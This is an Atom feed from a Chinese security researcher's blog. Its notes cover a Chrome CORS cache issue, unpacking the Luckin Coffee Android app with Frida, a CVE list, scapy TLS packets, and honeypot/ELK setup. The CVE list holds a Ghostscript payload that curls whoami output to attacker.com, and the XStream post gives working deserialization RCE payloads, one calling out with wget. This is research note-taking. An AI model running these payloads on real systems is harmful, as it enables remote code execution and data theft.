<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>少女的泪</title>
  
  <subtitle>是物语的开始</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-09T06:53:32.983Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>JOJO</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一个frida调试瑞幸的过程</title>
    <link href="http://yoursite.com/2020/01/13/%E5%85%B3%E4%BA%8ECORS%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/01/13/关于CORS的一些记录/</id>
    <published>2020-01-13T05:21:30.000Z</published>
    <updated>2020-03-09T06:53:32.983Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p><a href="https://b.cp0.win/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E9%85%8D%E5%90%88CORS%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2.php" target="_blank" rel="noopener">Chrome缓存和CORS</a>这个文章里记录的Chrome缓存存在问题，在<code>Access-Control-Allow-Origin:* 且Access-Control-Allow-Credentials: false</code>的情况下可能可以获取到敏感信息（credentials可能是true也行），</p><h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>先说一下关于这两个头部值的一些问题：</p><ol><li>当<code>Access-Control-Allow-Origin:*</code>时，credentials不能设置为true，设置为true可能会报错？（不确定），可以设置为false，设置为false不报错，不设置默认应该也是false，即允许任何域时不允许ajax请求传递敏感头部</li><li>当<code>Access-Control-Allow-Origin: 某域名</code>时，credentials设置true则是常见的配置漏洞，设置为false时浏览器如果发起ajax时设置withcredentials为true则报错</li><li>当不设置时默认为null，即拒绝除本域以外所有的域名<h2 id="0x02-想法"><a href="#0x02-想法" class="headerlink" title="0x02 想法"></a>0x02 想法</h2>如果文中所说的属实，那么这个漏洞存在应该很久了，而且利用条件很低，目测只要有敏感接口并且设置了<code>Access-Control-Allow-Origin:*</code>，那么这个接口就变成了一个在Chrome浏览器下接近于csrf漏洞。<br>比较一下这个漏洞和jsonp、csrf的差别：<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3>得存在callback的jsonp接口，存在这种接口，并且会根据cookies返回敏感信息，因为script标签会传递cookies所以就变成了csrf，防范手段也和csrf类似，但接口必须是支持jsonp格式的json接口<h3 id="一般csrf"><a href="#一般csrf" class="headerlink" title="一般csrf"></a>一般csrf</h3>一般的csrf通常是构造html表单并自动提交，通常是触发特定动作而不能获取到数据<h3 id="这个缓存漏洞"><a href="#这个缓存漏洞" class="headerlink" title="这个缓存漏洞"></a>这个缓存漏洞</h3>一般的通过js去拉取数据需要cors配置为<code>Access-Control-Allow-Origin: 某域名</code>且credentials设置true，利用该第三方域名可控来获取敏感数据，但如果配合Chrome缓存问题，可以把这个origin扩大到任意域名，但有个潜在的条件是需要用户先访问目标接口后缓存了页面数据，才可以读取该接口的返回数据。换句话说利用条件：</li><li>没有csrf防御</li><li>存在敏感信息或有利用价值的东西</li><li>origin为星号</li><li>用户在这之前用Chrome浏览器访问过该接口</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 起因&quot;&gt;&lt;/a&gt;0x00 起因&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://b.cp0.win/chrome%E6%B5%8F%E8%A7%8
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="浏览器" scheme="http://yoursite.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>记一个frida调试瑞幸的过程</title>
    <link href="http://yoursite.com/2020/01/13/%E8%AE%B0%E4%B8%80%E4%B8%AAfrida%E8%B0%83%E8%AF%95%E7%91%9E%E5%B9%B8%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/01/13/记一个frida调试瑞幸的过程/</id>
    <published>2020-01-13T05:21:30.000Z</published>
    <updated>2020-01-09T08:18:46.363Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h2><ol><li>通过pip安装frida</li><li>下载对应的frida-server到安卓端，进去运行server<h2 id="0x01-基本操作"><a href="#0x01-基本操作" class="headerlink" title="0x01 基本操作"></a>0x01 基本操作</h2></li><li>adb shell dumpsys activity top即可查看该app的包名</li><li>frida-trace -U -i open com.lucky.luckyclient    调用ptrace附着在进程上进行调试，-p指定pid</li><li>Frida-ps -U  列出安卓机器上运行的进程<h2 id="0x02-尝试使用Frida-unpack"><a href="#0x02-尝试使用Frida-unpack" class="headerlink" title="0x02 尝试使用Frida-unpack"></a>0x02 尝试使用Frida-unpack</h2></li><li><a href="https://github.com/dstmath/frida-unpack" target="_blank" rel="noopener">Frida-unpack</a>，先将安卓机器里的libart.so拉出来到Mac上，一般目录是在/system/lib64下，然后通过nm libart.so| grep OpenMemory命令查看函数名，我这边看了是和脚本里一样的就不改了。</li><li><p>clone过来后，修改openmemory.js里的路径改为对应的包名路径，这里要注意的是不要随意修改路径，可能会导致没权限写入，修改对应包名就行。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var file = new File("/data/data/com.lucky.luckyclient/dumps" + dex_size + ".dex", "wb")</span><br></pre></td></tr></table></figure><p> 这里改成这样</p></li><li><p>执行命令：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.lucky.luckyclient -l OpenMemory.js</span><br></pre></td></tr></table></figure></li><li><p>可以看到hook在进行了，但是由于壳比较新，中途被检测到后强制中断失败了</p><h2 id="0x03-试试别的思路"><a href="#0x03-试试别的思路" class="headerlink" title="0x03 试试别的思路"></a>0x03 试试别的思路</h2></li><li>尝试下载了历史版本2.6.0，发现是腾讯加固，使用上面的方式可以进行dumps</li><li>但是由于版本低，登录时获取不了短信，先不管他，试着用dex2jar逆向dex试试，发现成功转成jar</li><li>通过jd-gui一个个翻翻看在文件“dumps5046568-dex2jar.jar”中的com.lucky.lib.http2.c.class中找到了AES加密算法</li><li></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-准备&quot;&gt;&lt;a href=&quot;#0x00-准备&quot; class=&quot;headerlink&quot; title=&quot;0x00 准备&quot;&gt;&lt;/a&gt;0x00 准备&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;通过pip安装frida&lt;/li&gt;
&lt;li&gt;下载对应的frida-server到安卓端，
      
    
    </summary>
    
      <category term="app逆向" scheme="http://yoursite.com/categories/app%E9%80%86%E5%90%91/"/>
    
    
      <category term="frida" scheme="http://yoursite.com/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2019/10/17/Untitled/"/>
    <id>http://yoursite.com/2019/10/17/Untitled/</id>
    <published>2019-10-17T10:05:11.444Z</published>
    <updated>2019-11-21T11:42:17.818Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>热门CVE记录（一）</title>
    <link href="http://yoursite.com/2019/10/09/%E7%83%AD%E9%97%A8CVE%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2019/10/09/热门CVE记录（一）/</id>
    <published>2019-10-09T09:40:30.000Z</published>
    <updated>2019-11-11T06:17:56.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>CVE-2019-16920 | 20191005 | <a href="https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html" target="_blank" rel="noopener"> CVE-2019-16920 poc</a></p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="xstream"><a href="#xstream" class="headerlink" title="xstream"></a>xstream</h3><p>CVE-2019-10173 | 20190720 | 反序列化</p><h2 id="jira"><a href="#jira" class="headerlink" title="jira"></a>jira</h2><p>CVE-2019-14994 | 20190919 | url path traversal | <a href="https://zh-cn.tenable.com/blog/cve-2019-14994-url-path-traversal-vulnerability-in-jira-service-desk-leads-to-information" target="_blank" rel="noopener">/..;/</a><br>CVE-2019–11581｜20190601｜rce  | 印象笔记<br>CVE-2019-8451 | 20190925 | ssrf | <a href="https://lh5.googleusercontent.com/I3TRyJO61dcd_0VPMpTfER-9fMjPb4-aj1lJHej6eo9-b1jqjI-FMbeX44PJlWOs_Pv3VkPS3Fi-wYEutpukOUpBRqllY6SMxjKaJnRxIEunP3VzOZR1vewHJvPsgdHWDujHRbuD" target="_blank" rel="noopener">ssrf png</a></p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="joomla3-4-6rce-｜-20191008｜exp"><a href="#joomla3-4-6rce-｜-20191008｜exp" class="headerlink" title="joomla3.4.6rce ｜ 20191008｜exp"></a>joomla3.4.6rce ｜ 20191008｜<a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">exp</a></h3><h3 id="php-RCE-CVE-2019-11043-20191024-攻击工具"><a href="#php-RCE-CVE-2019-11043-20191024-攻击工具" class="headerlink" title="php RCE CVE-2019-11043  | 20191024 | 攻击工具"></a>php RCE CVE-2019-11043  | 20191024 | <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">攻击工具</a></h3><h2 id="Nhttpd"><a href="#Nhttpd" class="headerlink" title="Nhttpd"></a>Nhttpd</h2><p>CVE-2019-16278 ｜ 20191015 ｜ url path traversal ice <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits/src/branch/master/CVE-2019-16278.sh" target="_blank" rel="noopener">CVE-2019-16278</a></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Image / Video converters : Image magick : CVE-2016–3718(fill ‘url(<a href="http://attacker.com/)&#39;" target="_blank" rel="noopener">http://attacker.com/)&#39;</a>) CVE-2016–3718 / FFMPEG : CVE-2017–9993 (gen_xbin_playlist(playlist_location))</p><h2 id="postscript"><a href="#postscript" class="headerlink" title="postscript"></a>postscript</h2><p>CVE-2016-3714<br>CVE-2018-16509<br>CVE-2019-6116<br>CVE-2016-7976 RCE on PDF upload:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">currentdevice null true mark /OutputICCProfile (%pipe%curl attacker.com/?a=$(whoami|base64) )</span><br><span class="line">.putdeviceparams</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;路由器&quot;&gt;&lt;a href=&quot;#路由器&quot; class=&quot;headerlink&quot; title=&quot;路由器&quot;&gt;&lt;/a&gt;路由器&lt;/h2&gt;&lt;h3 id=&quot;Dlink&quot;&gt;&lt;a href=&quot;#Dlink&quot; class=&quot;headerlink&quot; title=&quot;Dlink&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="CVE记录" scheme="http://yoursite.com/categories/CVE%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="CVE记录" scheme="http://yoursite.com/tags/CVE%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>scapy发送TLS自定义包</title>
    <link href="http://yoursite.com/2019/09/10/scapy%E5%8F%91%E9%80%81TLS%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85/"/>
    <id>http://yoursite.com/2019/09/10/scapy发送TLS自定义包/</id>
    <published>2019-09-10T04:21:30.000Z</published>
    <updated>2019-09-16T06:45:06.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="00-安装配置scapy"><a href="#00-安装配置scapy" class="headerlink" title="00 安装配置scapy"></a>00 安装配置scapy</h2><p>直接从github上下载scapy源码，然后进入到目录中运行即可。<br>由于TLS并不是默认开启的layer，所以需要在配置项中的layer里加入tls。<br>运行后输入TLS查看是否报错，如果没有报错说明TLS层的启用正常。</p><h2 id="01-构造TLS请求"><a href="#01-构造TLS请求" class="headerlink" title="01 构造TLS请求"></a>01 构造TLS请求</h2><p>经过一系列的研究尝试，得出如下构造hello包的代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sn = ServerName(servername="<span class="tag">&lt;<span class="name">put</span> <span class="attr">server</span> <span class="attr">name</span> <span class="attr">here</span>&gt;</span>\x00\x00\x00\0")</span><br><span class="line">ext = [TLS_Ext_SupportedGroups(groups=["secp256r1"]),</span><br><span class="line">               TLS_Ext_ServerName(servernames=[sn]),</span><br><span class="line">               TLS_Ext_KeyShare_CH(client_shares=[KeyShareEntry(group=23)]),  # noqa: E501</span><br><span class="line">             #  TLS_Ext_SupportedVersions(versions=["TLS 1.3-d18"]),</span><br><span class="line">               TLS_Ext_SignatureAlgorithms(sig_algs=["sha256+rsapss",</span><br><span class="line">                                                     "sha256+rsa"])]</span><br><span class="line">p = TLSClientHello(ciphers=0x1301, ext=ext)</span><br><span class="line">TLSClientAutomaton(server="mail.xxxx.com",dport=995,client_hello=p).run()</span><br></pre></td></tr></table></figure></p><p>Servername那个参数可以替换成任意的服务器名即可达到我们的目的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;00-安装配置scapy&quot;&gt;&lt;a href=&quot;#00-安装配置scapy&quot; class=&quot;headerlink&quot; title=&quot;00 安装配置scapy&quot;&gt;&lt;/a&gt;00 安装配置scapy&lt;/h2&gt;&lt;p&gt;直接从github上下载scapy源码，然后进入到目录中运行
      
    
    </summary>
    
      <category term="网络安全" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="scapy" scheme="http://yoursite.com/tags/scapy/"/>
    
  </entry>
  
  <entry>
    <title>修改tpot蜜罐为主控+探测器模式</title>
    <link href="http://yoursite.com/2019/08/29/%E4%BF%AE%E6%94%B9tpot%E8%9C%9C%E7%BD%90%E4%B8%BA%E4%B8%BB%E6%8E%A7+%E6%8E%A2%E6%B5%8B%E5%99%A8%E6%A8%A1%E5%BC%8F/"/>
    <id>http://yoursite.com/2019/08/29/修改tpot蜜罐为主控+探测器模式/</id>
    <published>2019-08-29T04:31:30.000Z</published>
    <updated>2019-09-13T09:10:05.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-关于tpot相关"><a href="#0x00-关于tpot相关" class="headerlink" title="0x00 关于tpot相关"></a>0x00 关于tpot相关</h2><p>Tpot我个人理解是一个比较不错的高集成度的蜜罐系统，里面有很多的蜜罐使用docker封装起来独立运行。tpot则将每一个独立的蜜罐的日志格式整理起来最终通过ELK的形式统一展示，效果非常不错，下面是控制端的图：<br><img src="https://image.3001.net/images/20190913/1568364483_5d7b57c3e4aae.jpg!small" alt><br>这界面，这特效，没什么好说的就是棒，就是赛博朋克！<br>另外dashboard的模板不止一个，所以很不错，搜索那边日志也分割的很清晰，可以搜集到很多有用的信息。<br>如果我们不需要主控和探测分离，也就是所有的东西都装在一台机器上的话，可以不用看后面的内容，只需要找个可以上传自定义镜像的vps，然后安装标准版然后打开即可用，没有什么好说的。<br>现在我们希望实现的是如下模式：<br>  ————-> sensor1<br>controller |<br> —————>sensor2<br>即部署主从模式的蜜罐，仅仅在外网部署N个探测器，然后将日志信息全部集中到一台主控端上进行分析处理。我翻了一下tpot，貌似没有天生将主控和探测器分离安装，因此要实现这种形式需要手工进行分离ELK。<br>既然整个tpot日志分析都基于ELK，那么我们要做的也很简单，将elasticsearch和kibana分离出来作为主控端，每个sensor上部署logstash，logstash的日志发送地址全部发送到主控的elasticsearch就好了。<br>补一个tpot的地址：<a href="http://dtag-dev-sec.github.io/mediator/feature/2019/04/01/tpot-1903.html" title="tpot官网" target="_blank" rel="noopener">tpot官网</a></p><h2 id="0x01-提取主控"><a href="#0x01-提取主控" class="headerlink" title="0x01 提取主控"></a>0x01 提取主控</h2><p>   为了提取主控中的ES和logstash以及其他可能比较喜欢的辅助工具，可以先在自己的本地起个虚拟机，安装标准版的tpot，即安装的时候选择standard，等待安装完毕。<br>  然后我们要做的就是完成安装后进到系统里，默认启动后会自动启动所有的docker实例。使用docker命令将我们需要的实例单独打包成镜像倒出来，我们最需要的目前是elasticsearch、kibana、logstash，如果还有其他需要的也可以倒出来。打包成镜像的命令为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit xxxx:xxx //commit container to images</span><br><span class="line">sudo docker save xxxx &gt; xxx.tar //package the image to tar</span><br><span class="line">sudo docker inspect xxx //details of image or container</span><br></pre></td></tr></table></figure></p><p>然后把打包好的tar包保存起来，放到需要成为主控的地方重新转成container：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker load -i xxx.tar //import images from tar</span><br></pre></td></tr></table></figure></p><p>这里要注意的是es的容器其使用了虚拟机本地的data目录，建议把data目录里的数据一并考出去然后使移植过的es容器的data目录挂载到这个目录上，类似于：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 59200:9200 -v /mnt/nas/honeyportdata:/data:rw --name tpotes tpotes /usr/share/elasticsearch/bin/elasticsearch</span><br></pre></td></tr></table></figure></p><p>PS：建议在迁移的时候关注一下这几个容器的详细信息，里面会写着端口映射、目录映射、执行命令等，通过docker inspect命令。</p><h2 id="0x02-sensor和主控"><a href="#0x02-sensor和主控" class="headerlink" title="0x02 sensor和主控"></a>0x02 sensor和主控</h2><ol><li>首先我们要先部署tpot，找一个可以支持自定义镜像上传的vps厂家，我使用的是vultr，虚拟机一定要选8G4核以上的配置，不然会出一堆问题。</li><li>然后进入到安装界面就没什么好说的了，省去不说了，在VPS上我们选择安装模式的时候记得选sensor，因为我们只需要VPS上具备探测器功能即可。<ol start="3"><li>将之前分离出来的logstash镜像的tar包上传到sensor上，根据这个镜像起一个docker的容器实例。</li><li>主控这边使用之前提取出来的es和kibana镜像在本地创建实例，然后将复制出来的es的data目录映射到容器的es里，起来即可<h2 id="0x03-打通主控与sensor之间的日志传递"><a href="#0x03-打通主控与sensor之间的日志传递" class="headerlink" title="0x03 打通主控与sensor之间的日志传递"></a>0x03 打通主控与sensor之间的日志传递</h2></li><li>先来说说logstash，主要是负责收集sensor的日志并发送给es，直接通过docker exec进入到logstash容器中，修改其配置文件，将本地的es地址改为远程接收的地址，保存重启容器即可。</li><li>再来看看es，建议es先加个密码认证，密码认证直接在es容器里使用es自己的命令，里面有个生成password命令，敲一下跟着流程走就好，记录下密码后记得在logstash里也配上密码。其次确保ES的端口对外暴露，安全起见可以防火墙限制IP访问。es和logstash两边都通，logstash能正常推送给es就会在本地看到数据了。</li><li>如果ES在局域网内网，可能需要通过一些代理映射打通，如果通过花生壳之类的将ES映射到域名上，由于logstash不能配置域名，因此可以在sensor上在装个nginx进行反带处理，其他流程一致。</li><li>另外由于sensor与es之间可能网络不太好，建议配置nginx反带的超时时间长一些，logstash也配置一下超时时间，太短了容易一直报错<h2 id="0x04-目前存在的疑惑"><a href="#0x04-目前存在的疑惑" class="headerlink" title="0x04 目前存在的疑惑"></a>0x04 目前存在的疑惑</h2>连续好几次挂了一晚上，sensor上的容器就全部丢失了，很奇怪没有查到原因。<h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2>本文仅仅是一个思路的概括和一些坑的提示，具体ELK怎么操作和配置建议自行学习掌握，没那么复杂。</li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-关于tpot相关&quot;&gt;&lt;a href=&quot;#0x00-关于tpot相关&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于tpot相关&quot;&gt;&lt;/a&gt;0x00 关于tpot相关&lt;/h2&gt;&lt;p&gt;Tpot我个人理解是一个比较不错的高集成度的蜜罐系统
      
    
    </summary>
    
      <category term="蜜罐" scheme="http://yoursite.com/categories/%E8%9C%9C%E7%BD%90/"/>
    
    
      <category term="honeypot" scheme="http://yoursite.com/tags/honeypot/"/>
    
  </entry>
  
  <entry>
    <title>ELK安装使用相关记录</title>
    <link href="http://yoursite.com/2019/08/13/ELK%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/08/13/ELK安装使用相关记录/</id>
    <published>2019-08-12T18:21:30.000Z</published>
    <updated>2019-08-29T08:57:59.738Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ELK大概介绍"><a href="#0x00-ELK大概介绍" class="headerlink" title="0x00 ELK大概介绍"></a>0x00 ELK大概介绍</h2><p>ELK就是elastic search+logstash+kibana，然后logstash通常还要配上beats，简单的逻辑是：beats -> logstash->elastic search ->kibana</p><ol><li>beats是轻量型的数据采集装置，采集好数据后发送给logstash</li><li>logstash就像是一个日志搜集管道，里面带了一些日志格式的过滤插件，最后整合成统一格式的数据发送给elasticsearch</li><li>elasticsearch拿到数据后存起来就可以开始根据配置进行搜索了，提供了restful的接口</li><li>kibana作为开源通用的界面帮助我们快速的利用elasticsearch进行搜索</li></ol><h2 id="0x01-ELK安装"><a href="#0x01-ELK安装" class="headerlink" title="0x01 ELK安装"></a>0x01 ELK安装</h2><p>Ubuntu为例，现在官方提供了一系列的安装方式，可以直接参照官方文档进行安装即可。这里使用的是apt的安装方式：</p><ol><li>sudo apt-get install apt-transport-https</li><li>echo “deb <a href="https://artifacts.elastic.co/packages/7.x/apt" target="_blank" rel="noopener">https://artifacts.elastic.co/packages/7.x/apt</a> stable main” | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list</li><li>sudo apt-get update &amp;&amp; sudo apt-get install elasticsearch logstash kibana</li><li>beats的话要根据实际采集的数据格式去下载，比如mysql的话去下载mysqlbeats</li></ol><h2 id="0x02-配置密码认证"><a href="#0x02-配置密码认证" class="headerlink" title="0x02 配置密码认证"></a>0x02 配置密码认证</h2><ol><li>elasticsearch上新版本已经集成了xpack，进入到bin目录下，使用<code>elasticsearch-setup-password interactive</code>来交互性的设置密码，并且将密码记录下来</li><li>kibana中需要配置es的user和password选项，并且注意kibana的basepath</li><li>logstash中在output的es配置中配置正确的hosts、user、password选项，注意logstash的hosts可以接受域名，但是域名和端口必须能用IP访问，为了解决这个问题可以使用nginx代理来代理一层</li></ol><h2 id="0x99-java环境"><a href="#0x99-java环境" class="headerlink" title="0x99 java环境"></a>0x99 java环境</h2><p>ELK依赖于Java环境，官方说最好建议使用oracle jdk8，oracle现在下载jdk需要登陆注册，因此直接手工去下载包解压缩后手工配置。</p><ol><li>创建java的目录：<code>mkdir /usr/lib/jvm</code></li><li>下载并解压tar包：<code>sudo tar -zxvf /home/Downloads/jdk-8u221-linux-x64.tar.gz -C /usr/lib/jvm</code></li><li>为了便于java版本管理，这里使用Linux包版本管理工具update-alternatives其本质是软连接的管理，因此我们直接将javahome做软连接</li><li><code>sudo update-alternatives —install /usr/local/jdk jdk /usr/lib/jvm/jdk-8u22XXXXXX 300</code></li><li>然后将该软连接的jdk目录写入到环境变量中作为javahome： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#set oracle jdk environment</span><br><span class="line">export JAVA_HOME=/usr/local/jdk  ## 这里要注意目录要换成自己解压的jdk 目录</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure></li></ol><p>以后如果需要切换jdk版本，先通过install的方式注册jdk，然后通过命令：<br><code>update-alternatives —config jdk</code><br>来进行切换，install的时候后面的数字是优先级，在auto模式的时候有用默认根据数字大的优先作为版本使用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-ELK大概介绍&quot;&gt;&lt;a href=&quot;#0x00-ELK大概介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 ELK大概介绍&quot;&gt;&lt;/a&gt;0x00 ELK大概介绍&lt;/h2&gt;&lt;p&gt;ELK就是elastic search+logstash+k
      
    
    </summary>
    
      <category term="大数据" scheme="http://yoursite.com/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
      <category term="elk" scheme="http://yoursite.com/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>xstream-1.4.10反序列化漏洞</title>
    <link href="http://yoursite.com/2019/07/25/xstream-1.4.10%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/</id>
    <published>2019-07-24T18:21:30.000Z</published>
    <updated>2019-09-09T07:17:51.452Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-CVE-2019-10173"><a href="#0x00-CVE-2019-10173" class="headerlink" title="0x00 CVE-2019-10173"></a>0x00 CVE-2019-10173</h2><p>参考<a href="http://x-stream.github.io/changes.html#1.4.11" target="_blank" rel="noopener">http://x-stream.github.io/changes.html#1.4.11</a></p><h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01 payload"></a>0x01 payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可能的变形(似乎并不行)：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":["wget","http://2nmquk.ceye.io"]&#125;,"action":"start"&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x02-说明"><a href="#0x02-说明" class="headerlink" title="0x02 说明"></a>0x02 说明</h2><p>XML的payload是没问题的，json这些是改的，不见得可以，主要问题在于那个XML属性不知道怎么对应到json格式，不过xstream的反序列化函数确实是支持json和XML同时传入的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-CVE-2019-10173&quot;&gt;&lt;a href=&quot;#0x00-CVE-2019-10173&quot; class=&quot;headerlink&quot; title=&quot;0x00 CVE-2019-10173&quot;&gt;&lt;/a&gt;0x00 CVE-2019-10173&lt;/h2&gt;&lt;p&gt;参考
      
    
    </summary>
    
